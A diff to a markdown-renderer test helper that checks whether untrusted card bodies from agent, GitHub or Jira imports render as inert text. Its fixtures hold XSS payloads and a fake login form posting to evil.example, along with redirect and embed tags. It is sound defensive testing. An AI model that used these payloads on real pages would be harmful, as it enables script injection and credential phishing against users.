@@ -3,8 +3,8 @@ import { within } from '@testing-library/react';
 import { safeUrlTransform } from '../utils/safeUrlTransform';
 
 // Markup an external card author (agent, GitHub or Jira import) can plant in a
-// body. No markdown surface may run it or style the page with it; comments and
-// the text inside disallowed elements stay visible as text.
+// body. No markdown surface may run it or style the page with it; tags outside
+// the allowlist and comments show as literal text.
 export const RAW_HTML_BODY = [
   '<iframe srcdoc="<script>parent.alert(document.domain)</script>"></iframe>',
   '',
@@ -103,18 +103,23 @@ export function expectRawHtmlInert(root: HTMLElement) {
   expect(document.head.querySelector('meta[http-equiv], base, link[href*="evil.example"]')).toBeNull();
   expect((window as { markdownXss?: unknown }).markdownXss).toBeUndefined();
 
-  // Nothing the author wrote is hidden from the reader.
+  // The author's text and unrendered tags stay visible to the reader.
   for (const text of [
-    'window.markdownXss = true',
-    'svg text',
+    '<iframe srcdoc="<script>parent.alert(document.domain)</script>"></iframe>',
+    '<script>window.markdownXss = true</script>',
+    '<svg onload="window.markdownXss = true"><text>svg text</text></svg>',
     'fake login overlay',
-    'Log in',
+    '<form action="https://evil.example/collect">',
+    '<button>Log in</button></form>',
+    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
+    '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">',
     'template text',
     '<!--rehype:ignore:start-->',
     'text the agent sees',
   ]) {
     expect(root.textContent).toContain(text);
   }
+  expect(root.querySelector('img[src="x"]')).not.toBeNull();
 }
 
 export function expectMarkdownRendered(root: HTMLElement) {
